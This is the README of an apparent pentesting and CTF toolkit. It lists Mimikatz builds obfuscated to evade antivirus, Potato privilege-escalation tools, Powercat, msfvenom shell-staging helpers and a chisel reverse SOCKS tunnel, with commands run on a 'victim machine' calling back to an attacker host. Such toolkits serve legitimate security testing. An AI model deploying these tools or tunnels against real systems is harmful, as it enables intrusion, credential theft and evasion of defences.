# Kali Lootbox

This is a random collection of really handy scripts and binaries for use in pentesting or CTF. Some of the stuff I had to compile by hand because I couldn't find I couldn't find it anywhere else. Here's a list of the coolest stuff.

Some random things included...

* Chisel Client Socks - Static binaries for x86/x64 win/lin. This is a really cool tunneling application, but never supported reverse dynamic port forwarding with SOCKS5. I found some code that enables this support, and compiled the static binaries for both OS and architectures. Usage is like

```
# on kali box:
./chisel server -p 8080 --reverse

# on victim machine
chisel client 10.10.14.3:8080 R:socks

# edit /etc/proxychains.conf and change bottom line to:
socks5 127.0.0.1 1080

```

**Mount Shared Folder in VMWare**
It is unbelievable to me that Shared Folders in VMWare don't automatically mount or work in any way on Kali without jumping through hoops. I wrote a quick script you can run to mount the folder.

**Mimikatz** 
* Old binaries that still work well on server 2019
* A custom compiled version with some obfuscation
* Powershell obfuscation script based on BlackHills Infosec article:
https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/

**Juicy and Rogue Potato Privesc Techniques**
* x86 version of Juicy Potato is nowhere to be found, adapted the project to work for a CTF that required it.

* RoguePotato - A newer adapter version of Juicy that works on the most modern systems

**Watson and Seatbelt**
* compile latest version of these awesome privesc tools

**Powershell scripts**
* A handful of random powershell scripts that query AD information. 
* A fix for Powercat that doesn't require you to hit the enter key of the victim side. Not sure what that is even a thing but it is.
* A runas script that works a lot like sudo for Windows. The example uses a user to launch netcat, but you can use any binary you want.

**Metasploit/MSFVenom Automation**
* Wrote some quick helper scripts to automatically create msfvenom payloads, and supplementary Metasploit resource files to catch with multi/handler. Makes it really quick and easy to stage a shell and listener.

**Misc Python Scripts**
* The badchars array for buffer overflow
* A script for automating VRFY lookups with a text file of addressess
* A simple ping scanner